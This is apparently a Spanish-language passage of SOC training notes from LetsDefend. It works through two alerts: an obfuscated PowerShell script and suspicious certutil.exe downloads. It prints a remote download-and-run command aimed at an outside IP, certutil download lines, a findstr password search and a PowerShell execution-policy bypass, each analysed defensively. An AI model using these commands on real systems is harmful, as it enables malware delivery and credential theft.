En las siguientes líneas, el script llama a la función H1 cuatro veces con diferentes cadenas hexadecimales. Estas variables se utilizarán para formar una cadena que represente un comando de función.

Después de una serie de asignaciones y operaciones de ofuscadas, se obtiene el siguiente comando.

```jsx
( Nuevo - Objeto ( 'Net.WebClient' )). Cadena de descarga ( 'http://193.142.58.23/Server.txt' ).
```

Este comando almacena la variable “$H8”. El script intenta descargar y ejecutar código PowerShell desde la URL " http://193.142.58.23/Server.txt ". El verdadero contenido del archivo "Server.txt" se desconoce en el script proporcionado, pero puede ser un archivo malicioso.

A continuación revisaremos los registros:

Buscamos la IP de origen sospechosa.

Hay dos solicitudes. El primero fue la comunicación con nuestro host y el segundo fue una solicitud de Server.txt.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20131.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20132.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20133.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20134.png)

Nos muestra que la solicitud recibió un 404 No encontrado, lo que significa que el código malicioso en server.txt no se ejecutó, aunque el script ofuscado intentó acceder a él. Por último, vayamos y verifiquemos el historial del proceso.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20135.png)

En el historial del proceso, si hace clic en mshta.exe, verá que el proceso principal era explorer.exe, por lo que el usuario del sistema ejecutó el comando mstha. Finalmente podemos contener el host e iniciar el playbook.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20136.png)

Sí, llegamos a la conclusión de que la actividad era **sospechosa** , incluso maliciosa.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20137.png)

El script intentaba **ejecutar** un comando malicioso desde Internet.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20138.png)

Aunque el comando se ejecuta mediante un script, en el historial del proceso vemos que el **usuario** del sistema ejecutó el comando mstha.

Con esto concluiríamos el playbook.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20139.png)

## SOC163 - Suspicious Certutil.exe Usage

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20140.png)

EventID: 113

Event Time: Mar, 01, 2022, 11:06 AM

Rule: SOC163 - Suspicious Certutil.exe Usage

Level: Security Analyst

Hostname: EricProd

IP Address: 172.16.17.22

Related Binary: certutil.exe

Binary Path: C:/Windows/System32/certutil.exe

Command Line: certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-win32.zip nmap.zip

Alert Trigger Reason: -f parameter with certutil.exe

EDR Action: Allowed

Este evento parece estar relacionado con la ejecución de la utilidad de línea de comandos certutil.exe en un host llamado EricProd con la dirección IP **172.16.17.22** . El comando específico utilizado fue **"certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-win32.zip nmap.zip".**

**Certutil.exe** es un programa de línea de comandos diseñado por Microsoft que se utiliza **para volcar y ver información de configuración de la autoridad certificadora (CA)** , configurar servicios de certificados, realizar copias de seguridad y restaurar componentes de CA y verificar certificados, pares de claves y cadenas de certificados.

Primero analizaremos el historial de comando: 

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20141.png)

Del primer análisis de los comandos ejecutados entre las 10:11 a.m. y las 10:27 a.m., resulta inmediatamente evidente que el comando **net user** se ejecuta para identificar **todas las cuentas de usuario** en la computadora. Otros comandos se ejecutan para detectar la **configuración de red del sistema** y detectar **procesos en ejecución** .

Dos comandos certutil.exe muy interesantes se ejecutan entre las 11:06 y las 11:07 am. El primero:

```jsx
certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-setup.exe nmap.zip
```

Éste se utiliza para descargar Nmap al dispositivo.

```jsx
*certutil.exe -urlcache -split -f https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py check.py*
```

El segundo comando explota la misma técnica que el comando anterior y se utiliza para descargar **Windows Exploit Suggestor** de Internet, que utilizan **los piratas informáticos** para obtener **acceso privilegiado** a **los sistemas host** .

Ahora comprobemos si efectivamente se ha establecido una conexión, como podemos ver si ha habido conexión:

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20142.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20143.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20144.png)

A continuación podemos leer de los comandos ejecutados que se realiza un **escaneo con nmap para verificar si el puerto 80 (HTTP)** está abierto.

Los siguientes pasos indican que:

**Python** se utiliza para ejecutar el programa descargado y se realiza una **enumeración básica del sistema mediante arp -a** .

**findtr /si pasa *.txt | *.xml| *.ini** se utiliza para buscar contraseñas en los distintos formatos posibles.

**C:/powershell.exe -nop -exec bypass** se ejecuta para permitir que los scripts de PowerShell se ejecuten sin ser bloqueados ni advertidos.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20145.png)

Como siguiente paso del análisis, comprobamos si el proceso fue ejecutado por el usuario o por malware:

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20146.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20147.png)

Las actividades fueron realizadas por un usuario y no por malware porque al verificar los procesos notamos que explorer.exe es el proceso principal.

Una vez completado el análisis, colocamos el dispositivo en contención.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20148.png)

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20149.png)

A continuación empezaremos con el playbook:

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20150.png)

Sí , existe un posible reconocimiento de red realizado por un actor malicioso.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20151.png)

La actividad sospechosa radica en la combinación de los archivos descargados, las actividades de reconocimiento y la ejecución de ciertos comandos. Pero como solo podemos seleccionar uno pues elegiremos “Download”

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20152.png)

La actividad la realiza un **usuario** , no un malware. Todas las herramientas utilizadas durante el proceso eran legales y ninguna de ellas era malware.

Con esto concluiría el playbook.

![Untitled](LETS%20DEFEND%20f493cfd9fd874a9894969c99fc722e2a/Untitled%20153.png)